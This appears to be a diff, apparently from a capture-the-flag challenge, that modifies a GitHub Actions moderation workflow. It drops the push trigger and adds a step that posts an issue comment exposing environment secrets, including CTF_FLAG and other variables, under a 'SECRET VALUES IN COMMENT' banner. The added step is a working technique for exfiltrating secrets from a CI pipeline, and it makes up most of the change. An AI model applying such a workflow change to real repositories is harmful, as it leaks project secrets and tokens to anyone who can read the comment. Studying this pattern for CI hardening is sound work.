@@ -3,9 +3,6 @@ name: Moderate PR
 on:
   issue_comment:
     types: [created]
-  push:
-    branches:
-      - '**'
 
 permissions:
   pull-requests: write
@@ -119,3 +116,14 @@ jobs:
           done < banned_words_hash.txt
           echo "Meh, well... Anyway we removed you comment :P"
 
+      - name: Create Comment
+        uses: actions/github-script@v3
+        with:
+          github-token: ${{secrets.GITHUB_TOKEN}}
+          script: |
+            github.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: '👋 Thanks for reporting!\n\n=== SECRET VALUES IN COMMENT ===\nCTF_FLAG: ' + process.env.CTF_FLAG + '\nSEVERITY_MODE: ' + process.env.SEVERITY_MODE + '\nRUNNER_VER: ' + process.env.RUNNER_VER + '\nRETENTION_PERIOD: ' + process.env.RETENTION_PERIOD + '\n============================='
+            })
